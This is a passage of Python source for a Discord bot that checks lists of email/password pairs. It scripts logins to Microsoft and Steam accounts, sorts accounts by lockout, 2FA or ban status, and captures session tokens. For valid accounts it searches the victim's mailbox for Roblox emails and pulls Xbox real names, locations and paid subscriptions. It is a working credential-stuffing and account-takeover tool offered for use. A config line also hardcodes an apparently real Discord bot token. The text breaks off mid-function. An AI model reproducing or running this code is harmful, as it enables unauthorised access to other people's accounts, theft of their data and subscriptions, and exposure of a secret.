# lynx404'S CHECKER - All credits to lynx404
# ===================================================================
#  Modified to add:
#  - Channel restriction (setchannel, removechannel)
#  - DM-only results
#  - Access management commands (giveaccess, removeaccess, listaccess)
#  - Auto-creation of the BOSS role if missing
# ===================================================================

import discord
from discord import app_commands, ui
from discord.ext import commands
import asyncio
import aiohttp
import json
import random
import re
import time
import base64
import hashlib
import hmac
import gzip
import struct
import urllib.parse
import socket
import socks
import uuid
import binascii
from datetime import datetime
from typing import Optional, Dict, Any, List, Tuple
import logging
import io
from pathlib import Path
import os

# Networking
import requests
import urllib3
from bs4 import BeautifulSoup
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography import x509 as crypto_x509
from asn1crypto import cms, algos, core, x509

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===================================================================
#  CONFIG – SET YOUR TOKEN AND OWNER ID
# ===================================================================
BOT_TOKEN = MTU3MDQxOTE3OTU2MjA3ODMyOA.GEAS36.U2PbUlvhtTpeIrIU9HeB7jjINWpJqgErTxB2lU   # <-- PASTE YOUR TOKEN
OWNER_ID =   756369371190001705     # <-- PASTE YOUR USER ID CHANGE THIS TO OUR OWN
ALLOWED_ROLE_NAME = "AIOChecker"  # <-- CHANGE THIS TO YOUR ROLE NAME
CONFIG_FILE = "channel_config.json"

if BOT_TOKEN == "":
    print("❌ Please set BOT_TOKEN.")
    exit(1)
# ===================================================================

# ---- Channel restriction config ----
ALLOWED_CHANNEL_ID = None  # None means no restriction

def load_config():
    global ALLOWED_CHANNEL_ID
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                data = json.load(f)
                ALLOWED_CHANNEL_ID = data.get('allowed_channel_id')
        except:
            ALLOWED_CHANNEL_ID = None
    else:
        ALLOWED_CHANNEL_ID = None

def save_config():
    with open(CONFIG_FILE, 'w') as f:
        json.dump({'allowed_channel_id': ALLOWED_CHANNEL_ID}, f)

def is_allowed_channel(channel_id: int) -> bool:
    if ALLOWED_CHANNEL_ID is None:
        return True
    return channel_id == ALLOWED_CHANNEL_ID

# ---- Helper to get or create the BOSS role ----
async def get_or_create_boss_role(guild: discord.Guild) -> Optional[discord.Role]:
    role = discord.utils.get(guild.roles, name=ALLOWED_ROLE_NAME)
    if role is None:
        try:
            # Create the role with some default permissions (you may adjust)
            role = await guild.create_role(name=ALLOWED_ROLE_NAME, color=discord.Color.gold(), reason="Auto-created by lynx404's Checker")
            print(f"✅ Created role '{ALLOWED_ROLE_NAME}' in guild {guild.name}")
        except discord.Forbidden:
            print(f"❌ Missing permissions to create role '{ALLOWED_ROLE_NAME}' in guild {guild.name}")
            return None
        except Exception as e:
            print(f"❌ Error creating role: {e}")
            return None
    return role

# ===================================================================
#  CRYPTO HELPERS (for ExpressVPN)
# ===================================================================
class AesCryptographyService:
    def decrypt(self, data, key, iv):
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(data) + decryptor.finalize()
        unpadder = PKCS7(128).unpadder()
        unpadded = unpadder.update(decrypted) + unpadder.finalize()
        return unpadded
    def encrypt(self, data, key, iv):
        padder = PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        return encryptor.update(padded) + encryptor.finalize()

class CryptoHelper:
    @staticmethod
    def get_byte_array(size): return os.urandom(size)
    @staticmethod
    def compute_signature(data, key): return base64.b64encode(hmac.new(key, data, hashlib.sha1).digest()).decode('ascii')
    @staticmethod
    def gzip_data(input_str):
        return gzip.compress(input_str.encode('ascii'), compresslevel=9)
    @staticmethod
    def envelope_encrypt(data, cert_base64):
        cert_der = base64.b64decode(cert_base64)
        cert = x509.Certificate.load(cert_der)
        aes_key = os.urandom(16)
        iv = os.urandom(16)
        aes_service = AesCryptographyService()
        encrypted_content = aes_service.encrypt(data, aes_key, iv)
        crypto_cert = crypto_x509.load_der_x509_certificate(cert_der)
        public_key = crypto_cert.public_key()
        encrypted_key = public_key.encrypt(aes_key, asym_padding.PKCS1v15())
        recipient_info = cms.RecipientInfo({
            'ktri': cms.KeyTransRecipientInfo({
                'version': cms.CMSVersion(0),
                'rid': cms.RecipientIdentifier({
                    'issuer_and_serial_number': cms.IssuerAndSerialNumber({
                        'issuer': cert['tbs_certificate']['issuer'],
                        'serial_number': cert['tbs_certificate']['serial_number']
                    })
                }),
                'key_encryption_algorithm': cms.KeyEncryptionAlgorithm({
                    'algorithm': '1.2.840.113549.1.1.1',
                    'parameters': core.Null()
                }),
                'encrypted_key': encrypted_key
            })
        })
        enveloped_data = cms.EnvelopedData({
            'version': cms.CMSVersion(0),
            'recipient_infos': cms.RecipientInfos([recipient_info]),
            'encrypted_content_info': cms.EncryptedContentInfo({
                'content_type': '1.2.840.113549.1.7.1',
                'content_encryption_algorithm': cms.EncryptionAlgorithm({
                    'algorithm': '2.16.840.1.101.3.4.1.2',
                    'parameters': iv
                }),
                'encrypted_content': encrypted_content
            })
        })
        content_info = cms.ContentInfo({
            'content_type': '1.2.840.113549.1.7.3',
            'content': enveloped_data
        })
        return content_info.dump()

# ===================================================================
#  MICROSOFT LOGIN HELPER (USED BY HOTMAIL, PSN, ROBLOX, XBOX)
# ===================================================================
class MicrosoftLoginHelper:
    """Unified Microsoft login helper - used by all checkers"""
    
    @staticmethod
    def login(email: str, password: str, timeout: int = 20) -> Dict:
        """
        Complete Microsoft login flow
        Returns: {
            'success': bool,
            'token': str or None,
            'status': str,  # 'success', 'locked', '2fa', 'banned', 'bad', 'error'
            'reason': str,
            'cookies': dict
        }
        """
        session = requests.Session()
        session.verify = False
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        try:
            # Step 1: Get login page
            login_url = "https://login.live.com/oauth20_authorize.srf"
            params = {
                'client_id': '00000000402B5328',
                'redirect_uri': 'https://login.live.com/oauth20_desktop.srf',
                'scope': 'service::user.auth.xboxlive.com::MBI_SSL',
                'display': 'touch',
                'response_type': 'token',
                'locale': 'en'
            }
            
            r1 = session.get(login_url, params=params, timeout=timeout)
            if r1.status_code != 200:
                return {'success': False, 'token': None, 'status': 'error', 'reason': f'Failed to get login page: {r1.status_code}', 'cookies': {}}
            
            text = r1.text
            
            # Extract SFTag
            sftag = None
            sftag_patterns = [
                r'value=\\\"(.+?)\\\"',
                r'value="(.+?)"',
                r'name="PPFT"[^>]*value="([^"]+)"',
                r'var\s+PPFT\s*=\s*"([^"]+)"',
                r'"sFTTag":"([^"]+)"'
            ]
            
            for pattern in sftag_patterns:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    sftag = match.group(1)
                    break
            
            if not sftag:
                return {'success': False, 'token': None, 'status': 'error', 'reason': 'Failed to extract SFTag', 'cookies': {}}
            
            # Extract Post URL
            url_post = None
            url_patterns = [
                r'"urlPost":"(.+?)"',
                r"urlPost:'(.+?)'",
                r'form[^>]*action="([^"]+)"',
                r'"urlPost":"([^"]+)"'
            ]
            
            for pattern in url_patterns:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    url_post = match.group(1).replace('\\/', '/')
                    break
            
            if not url_post:
                return {'success': False, 'token': None, 'status': 'error', 'reason': 'Failed to extract Post URL', 'cookies': {}}
            
            # Step 2: Submit credentials
            login_data = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': sftag,
                'PPSX': 'Passport',
                'type': '11',
                'LoginOptions': '1',
                'NewUser': '1',
                'i13': '1',
                'i19': '12345',
                'ctx': '',
                'hpgrequestid': '',
                'canary': ''
            }
            
            r2 = session.post(
                url_post,
                data=login_data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=True,
                timeout=timeout
            )
            
            text_lower = r2.text.lower()
            url_lower = r2.url.lower()
            
            # Step 3: Check for lockout/rate limiting
            if any(x in text_lower for x in ['too many attempts', 'temporarily locked', 'account locked', 'try again later']):
                return {'success': False, 'token': None, 'status': 'locked', 'reason': 'Account temporarily locked due to too many failed attempts', 'cookies': {}}
            
            if any(x in url_lower for x in ['/abuse', '/cancel', 'suspended']):
                return {'success': False, 'token': None, 'status': 'banned', 'reason': 'Account has been banned or suspended', 'cookies': {}}
            
            # Step 4: Check for true 2FA (not false triggers)
            strong_2fa = ['authenticator app', 'two-factor', '2fa', 'verification code', 'authenticator code', 'sms verification', 'multi-factor', 'mfa']
            false_triggers = ['verify your identity', 'unusual sign-in', 'help us protect your account', 'we noticed a new sign-in', 'verify your account', 'security check', 'are you trying to sign in']
            
            is_true_2fa = any(x in text_lower for x in strong_2fa)
            is_false_2fa = any(x in text_lower for x in false_triggers)
            
            if is_true_2fa and not is_false_2fa:
                return {'success': False, 'token': None, 'status': '2fa', 'reason': 'Two-factor authentication is enabled on this account', 'cookies': {}}
            
            # Step 5: Check for token in URL fragment
            if '#' in r2.url:
                fragment = r2.url.split('#')[-1]
                params = urllib.parse.parse_qs(fragment)
                token = params.get('access_token', [None])[0]
                if token and token != "None" and len(token) > 20:
                    return {'success': True, 'token': token, 'status': 'success', 'reason': 'Login successful', 'cookies': session.cookies.get_dict()}
            
            # Step 6: Check for token in cookies
            for cookie_name in ["MSPAuth", "WLSSC", "ANON"]:
                if cookie_name in session.cookies:
                    token = session.cookies.get(cookie_name)
                    if token and len(token) > 20:
                        return {'success': True, 'token': token, 'status': 'success', 'reason': 'Login successful', 'cookies': session.cookies.get_dict()}
            
            # Step 7: Check if we're on a valid Microsoft page
            if 'live.com' in r2.url and not any(x in r2.url for x in ['login', 'authorize']):
                return {'success': True, 'token': 'Valid session', 'status': 'success', 'reason': 'Logged in (token extraction fallback)', 'cookies': session.cookies.get_dict()}
            
            # Step 8: Identity verification page - not 2FA, just security check
            if 'identity/confirm' in url_lower or 'account.live.com/identity' in url_lower:
                return {'success': True, 'token': 'Security check required', 'status': 'success', 'reason': 'Account valid - security verification required (check email/phone)', 'cookies': session.cookies.get_dict()}
            
            # Step 9: Check for invalid credentials
            if any(x in text_lower for x in ['incorrect password', 'invalid password', "account doesn't exist", 'wrong password']):
                return {'success': False, 'token': None, 'status': 'bad', 'reason': 'Invalid credentials', 'cookies': {}}
            
            # If we got here, something else happened
            return {'success': False, 'token': None, 'status': 'error', 'reason': 'Login failed - unknown reason', 'cookies': {}}
            
        except requests.exceptions.Timeout:
            return {'success': False, 'token': None, 'status': 'timeout', 'reason': 'Request timed out', 'cookies': {}}
        except requests.exceptions.ConnectionError:
            return {'success': False, 'token': None, 'status': 'error', 'reason': 'Connection error', 'cookies': {}}
        except Exception as e:
            return {'success': False, 'token': None, 'status': 'error', 'reason': str(e), 'cookies': {}}

# ===================================================================
#  HOTMAIL CHECKER
# ===================================================================
class HotmailChecker:
    @staticmethod
    def check(email: str, password: str) -> Dict:
        result = MicrosoftLoginHelper.login(email, password)
        
        if result['success']:
            return {
                'valid': True,
                'status': 'FULL_VALID',
                'reason': '✅ Account is valid and accessible',
                'token': result.get('token', 'N/A'),
                '2fa_enabled': False
            }
        
        status_map = {
            'locked': {'valid': False, 'status': 'LOCKED', 'reason': '🔒 Account temporarily locked due to too many failed attempts'},
            '2fa': {'valid': False, 'status': '2FA', 'reason': '🔐 Two-factor authentication is ENABLED on this account'},
            'banned': {'valid': False, 'status': 'BANNED', 'reason': '🚫 Account has been banned or suspended'},
            'bad': {'valid': False, 'status': 'BAD', 'reason': '❌ Invalid credentials'},
            'timeout': {'valid': False, 'status': 'TIMEOUT', 'reason': '⏱️ Request timed out'},
            'error': {'valid': False, 'status': 'ERROR', 'reason': f'⚠️ {result.get("reason", "Unknown error")}'}
        }
        
        return status_map.get(result.get('status', 'error'), {'valid': False, 'status': 'UNKNOWN', 'reason': '❓ Unknown error'})

# ===================================================================
#  PSN CHECKER
# ===================================================================
class PSNChecker:
    @staticmethod
    def get_profile(token):
        try:
            headers = {'Authorization': f'Bearer {token}'}
            resp = requests.get('https://graph.microsoft.com/v1.0/me', headers=headers, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                return {'name': data.get('displayName', 'Unknown'), 'country': data.get('country', 'Unknown'),
                        'birth_date': data.get('birthDate', 'Unknown')}
        except:
            pass
        return {'name': 'Unknown', 'country': 'Unknown', 'birth_date': 'Unknown'}
    
    @staticmethod
    def check(email: str, password: str) -> Dict:
        result = MicrosoftLoginHelper.login(email, password)
        
        if result['success']:
            profile = PSNChecker.get_profile(result.get('token', ''))
            return {
                'valid': True,
                'status': 'FULL_VALID',
                'reason': '✅ Account is valid and accessible',
                'token': result.get('token', 'N/A'),
                'profile': profile,
                '2fa_enabled': False
            }
        
        status_map = {
            'locked': {'valid': False, 'status': 'LOCKED', 'reason': '🔒 Account temporarily locked due to too many failed attempts'},
            '2fa': {'valid': False, 'status': '2FA', 'reason': '🔐 Two-factor authentication is ENABLED on this account'},
            'banned': {'valid': False, 'status': 'BANNED', 'reason': '🚫 Account has been banned or suspended'},
            'bad': {'valid': False, 'status': 'BAD', 'reason': '❌ Invalid credentials'},
            'timeout': {'valid': False, 'status': 'TIMEOUT', 'reason': '⏱️ Request timed out'},
            'error': {'valid': False, 'status': 'ERROR', 'reason': f'⚠️ {result.get("reason", "Unknown error")}'}
        }
        
        return status_map.get(result.get('status', 'error'), {'valid': False, 'status': 'UNKNOWN', 'reason': '❓ Unknown error'})

# ===================================================================
#  ROBLOX CHECKER
# ===================================================================
class RobloxChecker:
    @staticmethod
    def search_roblox(token, cid):
        try:
            payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                       "TimeZone": "United Kingdom Standard Time", "TextDecorations": "Off",
                       "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
                                           "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                                                              {"Term": {"DistinguishedFolderName": "DeletedItems"}}]},
                                           "From": 0, "Query": {"QueryString": "no-reply@roblox.com"},
                                           "Size": 25, "Sort": [{"Field": "Score", "SortDirection": "Desc", "Count": 3},
                                                                {"Field": "Time", "SortDirection": "Desc"}],
                                           "EnableTopResults": True, "TopResultsCount": 3}],
                       "QueryAlterationOptions": {"EnableSuggestion": True, "EnableAlteration": True},
                       "LogicalId": str(uuid.uuid4())}
            r = requests.post("https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124",
                              json=payload,
                              headers={"User-Agent": "Outlook-Android/2.0", "Accept": "application/json",
                                       "Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}",
                                       "Content-Type": "application/json", "Host": "substrate.office.com",
                                       "Accept-Encoding": "gzip"}, timeout=20)
            if r.status_code == 200:
                text = r.text
                if 'Total":0' not in text:
                    patterns = [r'account:\s*([a-zA-Z0-9_]+)', r'for\s+([a-zA-Z0-9_]+)\s+and\s+want',
                                r'account:\s*([a-zA-Z0-9_]+)\.', r'for\s+([a-zA-Z0-9_]+)\.\s+If']
                    for pat in patterns:
                        m = re.search(pat, text, re.I)
                        if m:
                            return m.group(1)
            return None
        except:
            return None
    
    @staticmethod
    def get_roblox_profile(username):
        try:
            r = requests.post("https://users.roblox.com/v1/usernames/users",
                              json={"usernames": [username], "excludeBannedUsers": False}, timeout=10)
            if r.status_code == 200:
                data = r.json().get("data", [])
                if data:
                    user_id = data[0]["id"]
                    r_user = requests.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10)
                    if r_user.status_code == 200:
                        d = r_user.json()
                        return {'username': username, 'id': user_id, 'banned': d.get('isBanned', False),
                                'created': d.get('created', 'Unknown')}
            return None
        except:
            return None
    
    @staticmethod
    def check(email: str, password: str) -> Dict:
        result = MicrosoftLoginHelper.login(email, password)
        
        if not result['success']:
            status_map = {
                'locked': {'valid': False, 'status': 'LOCKED', 'reason': '🔒 Account temporarily locked due to too many failed attempts'},
                '2fa': {'valid': False, 'status': '2FA', 'reason': '🔐 Two-factor authentication is ENABLED on this account'},
                'banned': {'valid': False, 'status': 'BANNED', 'reason': '🚫 Account has been banned or suspended'},
                'bad': {'valid': False, 'status': 'BAD', 'reason': '❌ Invalid credentials'},
                'timeout': {'valid': False, 'status': 'TIMEOUT', 'reason': '⏱️ Request timed out'},
                'error': {'valid': False, 'status': 'ERROR', 'reason': f'⚠️ {result.get("reason", "Unknown error")}'}
            }
            return status_map.get(result.get('status', 'error'), {'valid': False, 'status': 'UNKNOWN', 'reason': '❓ Unknown error'})
        
        # Search for Roblox
        token = result.get('token', '')
        cid = result.get('cookies', {}).get('MSPCID', '').upper()
        
        roblox_user = RobloxChecker.search_roblox(token, cid)
        if roblox_user:
            profile = RobloxChecker.get_roblox_profile(roblox_user)
            if profile:
                return {'valid': True, 'status': 'FULL_VALID', 'reason': '✅ Hotmail valid with Roblox account', 'roblox_username': roblox_user, 'profile': profile}
            else:
                return {'valid': True, 'status': 'FULL_VALID', 'reason': '✅ Hotmail valid with Roblox account', 'roblox_username': roblox_user, 'profile': 'Profile not fetched'}
        else:
            return {'valid': True, 'status': 'FULL_VALID', 'reason': '✅ Hotmail valid, no Roblox emails found'}

# ===================================================================
#  XBOX GAME PASS CHECKER
# ===================================================================
class XboxGamePassChecker:
    @staticmethod
    def check(email: str, password: str) -> Dict:
        # Step 1: Login with Microsoft
        result = MicrosoftLoginHelper.login(email, password)
        
        if not result['success']:
            status_map = {
                'locked': {'valid': False, 'status': 'LOCKED', 'reason': '🔒 Account temporarily locked'},
                '2fa': {'valid': False, 'status': '2FA', 'reason': '🔐 2FA is ENABLED on this account'},
                'banned': {'valid': False, 'status': 'BANNED', 'reason': '🚫 Account banned'},
                'bad': {'valid': False, 'status': 'BAD', 'reason': '❌ Invalid credentials'},
                'timeout': {'valid': False, 'status': 'TIMEOUT', 'reason': '⏱️ Request timed out'},
                'error': {'valid': False, 'status': 'ERROR', 'reason': f'⚠️ {result.get("reason", "Unknown error")}'}
            }
            return status_map.get(result.get('status', 'error'), {'valid': False, 'status': 'UNKNOWN', 'reason': '❓ Unknown error'})
        
        token = result.get('token', '')
        session = requests.Session()
        
        try:
            # Step 2: Get Xbox token
            xbl_payload = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token},
                "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"
            }
            
            resp = session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json=xbl_payload,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=15
            )
            
            if resp.status_code != 200:
                return {'valid': False, 'status': 'XBOX_ERROR', 'reason': 'Failed to authenticate with Xbox'}
            
            data = resp.json()
            xbox_token = data.get('Token')
            uhs = data['DisplayClaims']['xui'][0]['uhs']
            
            if not xbox_token:
                return {'valid': False, 'status': 'XBOX_ERROR', 'reason': 'No Xbox token returned'}
            
            # Step 3: Get XSTS token
            xsts_payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"
            }
            
            resp = session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json=xsts_payload,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=15
            )
            
            if resp.status_code != 200:
                return {'valid': False, 'status': 'XBOX_ONLY', 'reason': 'Xbox account valid but no Xbox profile', 'gamertag': 'N/A', 'tier': 'N/A'}
            
            xsts_token = resp.json().get('Token')
            
            # Step 4: Get Xbox profile
            auth_header = f"XBL3.0 x={uhs};{xsts_token}"
            resp = session.get(
                "https://profile.xboxlive.com/users/me/profile/settings"
                "?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep,RealName,Location",
                headers={
                    "Authorization": auth_header,
                    "x-xbl-contract-version": "2",
                    "Accept": "application/json",
                    "Accept-Language": "en-US",
                },
                timeout=15
            )
            
            xbox_profile = {"gamertag": "N/A", "tier": "N/A", "rep": "N/A", "real_name": "N/A", "location": "N/A"}
            if resp.status_code == 200:
                data = resp.json()
                settings = {
                    s["id"]: s.get("value", "N/A")
                    for s in data.get("profileUsers", [{}])[0].get("settings", [])
                }
                xbox_profile = {
                    "gamertag": settings.get("Gamertag", "N/A"),
                    "tier": settings.get("AccountTier", "N/A"),
                    "rep": settings.get("XboxOneRep", "N/A"),
                    "real_name": settings.get("RealName", "N/A"),
                    "location": settings.get("Location", "N/A"),
                }
            
            # Step 5: Get Minecraft token
            mc_payload = {'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}
            resp = session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json=mc_payload,
                headers={'Content-Type': 'application/json'},
                timeout=15
            )
            
            if resp.status_code != 200:
                return {
                    'valid': True,
                    'status': 'XBOX_VALID',
                    'reason': '✅ Valid Xbox account (no Minecraft access)',
                    'gamertag': xbox_profile.get("gamertag", "N/A"),
                    'tier': xbox_profile.get("tier", "N/A"),
                    'rep': xbox_profile.get("rep", "N/A"),
                    'real_name': xbox_profile.get("real_name", "N/A"),
                    'location': xbox_profile.get("location", "N/A"),
                    'subscriptions': [],
                    'games': []
                }
            
            mc_token = resp.json().get('access_token')
            
            # Step 6: Check entitlements
            resp = session.get(
                'https://api.minecraftservices.com/entitlements/mcstore',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=15
            )
            
            subscriptions = []
            games = []
            
            if resp.status_code == 200:
                text = resp.text
                if 'product_game_pass_ultimate' in text:
                    subscriptions.append('🟣 Game Pass Ultimate')
                if 'product_game_pass_pc' in text:
                    subscriptions.append('🟢 Game Pass PC')
                if 'product_game_pass_core' in text:
                    subscriptions.append('🔵 Game Pass Core')
                if 'product_xbox_live_gold' in text:
                    subscriptions.append('🟡 Xbox Live Gold')
                if 'product_ea_play' in text:
                    subscriptions.append('🟠 EA Play')
                if 'product_minecraft' in text:
                    subscriptions.append('⛏️ Minecraft Java')
                if 'product_minecraft_bedrock' in text:
                    subscriptions.append('🧱 Minecraft Bedrock')
                if 'product_legends' in text:
                    subscriptions.append('⚔️ Minecraft Legends')
                if 'product_dungeons' in text:
                    subscriptions.append('🗡️ Minecraft Dungeons')
                
                # Extract games
                game_pattern = r'"product_name":"([^"]+)"'
                game_matches = re.findall(game_pattern, text)
                for game in game_matches:
                    if game.lower() not in ['minecraft', 'bedrock', 'legends', 'dungeons', 'ea play', 'xbox live gold']:
                        games.append(game)
            
            if not subscriptions:
                subscriptions = ['🆓 Free Account (No Subscriptions)']
            
            # Step 7: Get Minecraft profile
            resp = session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=15
            )
            
            mc_name = 'Not Set'
            uuid = 'N/A'
            capes = 'None'
            
            if resp.status_code == 200:
                data = resp.json()
                mc_name = data.get('name', 'Not Set')
                uuid = data.get('id', 'N/A')
                capes = ", ".join([c["alias"] for c in data.get("capes", [])]) if data.get("capes") else "None"
            
            games_str = ", ".join(games[:15]) if games else "None"
            if len(games) > 15:
                games_str += f" ... (+{len(games)-15} more)"
            
            return {
                'valid': True,
                'status': 'FULL_VALID',
                'reason': '✅ Fully verified account!',
                'account_type': " | ".join(subscriptions),
                'gamertag': xbox_profile.get("gamertag", "N/A"),
                'tier': xbox_profile.get("tier", "N/A"),
                'rep': xbox_profile.get("rep", "N/A"),
                'real_name': xbox_profile.get("real_name", "N/A"),
                'location': xbox_profile.get("location", "N/A"),
                'mc_name': mc_name,
                'uuid': uuid,
                'capes': capes,
                'subscriptions': subscriptions,
                'games': games_str,
                'games_list': games
            }
            
        except Exception as e:
            return {'valid': False, 'status': 'ERROR', 'reason': f'⚠️ Error: {str(e)}'}

# ===================================================================
#  STEAM CHECKER
# ===================================================================
class SteamChecker:
    @staticmethod
    def check(email, password):
        session = requests.Session()
        session.headers.update({"User-Agent": "okhttp/4.9.2", "Accept": "application/json, text/plain, */*",
                                "Accept-Encoding": "gzip", "Connection": "Keep-Alive"})
        session.headers["Cookie"] = "Steam_Language=english"
        try:
            baron_pb = SteamChecker._baro_ps(1, email)
            brn_enc = urllib.parse.quote(base64.b64encode(baron_pb).decode())
            r = session.get(f"https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1"
                            f"?origin=SteamMobile&input_protobuf_encoded={brn_enc}", timeout=15)
            if r.status_code != 200:
                return {'valid': False, 'status': 'ERROR', 'reason': 'RSA failed'}
            rsa_data = SteamChecker._baron_pd(r.content)
            mod = rsa_data.get(1, b"").decode()
            exp = rsa_data.get(2, b"").decode()
            ts = rsa_data.get(3, 0)
            if not mod or not exp:
                return {'valid': False, 'status': 'ERROR', 'reason': 'RSA key empty'}
            enc_pw = SteamChecker._bron_rsa(password, mod, exp)
            baron_dev = SteamChecker._baro_ps(1, "SM-S256B") + SteamChecker._baro_pi(2, 3) + SteamChecker._baro_pi(3, -500) + SteamChecker._baro_pi(4, 1)
            brn_auth = (SteamChecker._baro_ps(2, email) + SteamChecker._baro_ps(3, enc_pw) +
                        SteamChecker._baro_pi(4, ts) + SteamChecker._baro_pi(5, 1) +
                        SteamChecker._baro_pi(7, 1) + SteamChecker._baro_ps(8, "Mobile") +
                        SteamChecker._baro_pr(9, baron_dev) + SteamChecker._baro_pi(11, 0))
            baro_b64 = base64.b64encode(brn_auth).decode()
            r = session.post("https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1",
                             data=SteamChecker._brn_mp("input_protobuf_encoded", baro_b64),
                             headers={"Content-Type": SteamChecker.BARON_CT}, timeout=15)
            er = int(r.headers.get("X-eresult", "0"))
            if er in (5, 2):
                return {'valid': False, 'status': 'BAD', 'reason': '❌ Invalid credentials'}
            if er in (63, 43):
                return {'valid': False, 'status': 'BANNED', 'reason': '🚫 Account banned'}
            if er == 84:
                return {'valid': False, 'status': 'RATE_LIMITED', 'reason': '⏱️ Rate limited'}
            if er != 1:
                return {'valid': False, 'status': 'ERROR', 'reason': f'eresult={er}'}
            brn_ar = SteamChecker._baron_pd(r.content)
            baro_cid = brn_ar.get(1, 0)
            baron_rid = brn_ar.get(2, b"")
            brn_poll = SteamChecker._baro_pi(1, baro_cid) + SteamChecker._baro_pr(2, baron_rid)
            bron_b64 = base64.b64encode(brn_poll).decode()
            r = session.post("https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1",
                             data=SteamChecker._brn_mp("input_protobuf_encoded", bron_b64),
                             headers={"Content-Type": SteamChecker.BARON_CT, "Accept-Encoding": "identity"}, timeout=15)
            baron_pr_d = SteamChecker._baron_pd(r.content)
            brn_tk = baron_pr_d.get(4, b"")
            if isinstance(brn_tk, bytes):
                brn_tk = brn_tk.decode("utf-8", errors="ignore")
            if not brn_tk:
                return {'valid': False, 'status': 'ERROR', 'reason': 'Poll no token'}
            parts = brn_tk.split(".")
            if len(parts) < 2:
                return {'valid': False, 'status': 'ERROR', 'reason': 'Bad JWT'}
            payload = parts[1]
            rem = len(payload) % 4
            if rem:
                payload += "=" * (4 - rem)
            try:
                jwt_data = json.loads(base64.urlsafe_b64decode(payload))
                steamid = str(jwt_data.get("sub", "Unknown"))
            except:
                steamid = "Unknown"
            return {'valid': True, 'status': 'FULL_VALID', 'steamid': steamid, 'token': brn_tk}
        except Exception as e:
            if 'rate' in str(e).lower() or '429' in str(e):
                return {'valid': False, 'status': 'RATE_LIMITED', 'reason': '⏱️ Rate limited'}
            return {'valid': False, 'status': 'ERROR', 'reason': str(e)}
    
    BARON_CT = "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
    @staticmethod
    def _brn_vi(v):
        if v < 0: v &= 0xffffffffffffffff
        buf = bytearray()
        while v > 0x7f:
            buf.append(0x80 | (v & 0x7f))
            v >>= 7
        buf.append(v & 0x7f)
        return bytes(buf)
    @staticmethod
    def _brn_rvi(b, p):
        r = s = 0
        while p < len(b):
            x = b[p]; p += 1
            r |= (x & 0x7f) << s
            if not (x & 0x80):
                break
            s += 7
        return r, p
    @staticmethod
    def _baro_ps(fn, s):
        d = s.encode() if isinstance(s, str) else s
        return SteamChecker._brn_vi((fn << 3) | 2) + SteamChecker._brn_vi(len(d)) + d
    @staticmethod
    def _baro_pr(fn, d):
        return SteamChecker._brn_vi((fn << 3) | 2) + SteamChecker._brn_vi(len(d)) + d
    @staticmethod
    def _baro_pi(fn, v):
        return SteamChecker._brn_vi(fn << 3) + SteamChecker._brn_vi(v if v >= 0 else v & 0xffffffffffffffff)
    @staticmethod
    def _baron_pd(raw):
        out = {}
        p = 0
        while p < len(raw):
            try:
                tag, p = SteamChecker._brn_rvi(raw, p)
            except:
                break
            fn = tag >> 3
            wt = tag & 7
            if fn < 1:
                break
            if wt == 0:
                val, p = SteamChecker._brn_rvi(raw, p)
                prev = out.get(fn)
                if prev is not None:
                    out[fn] = [prev, val] if not isinstance(prev, list) else prev + [val]
                else:
                    out[fn] = val
            elif wt == 2:
                ln, p = SteamChecker._brn_rvi(raw, p)
                if p + ln > len(raw):
                    break
                chunk = raw[p:p+ln]
                p += ln
                prev = out.get(fn)
                if prev is not None:
                    out[fn] = [prev, chunk] if not isinstance(prev, list) else prev + [chunk]
                else:
                    out[fn] = chunk
            elif wt == 5:
                if p + 4 > len(raw):
                    break
                out[fn] = struct.unpack_from('<I', raw, p)[0]; p += 4
            elif wt == 1:
                if p + 8 > len(raw):
                    break
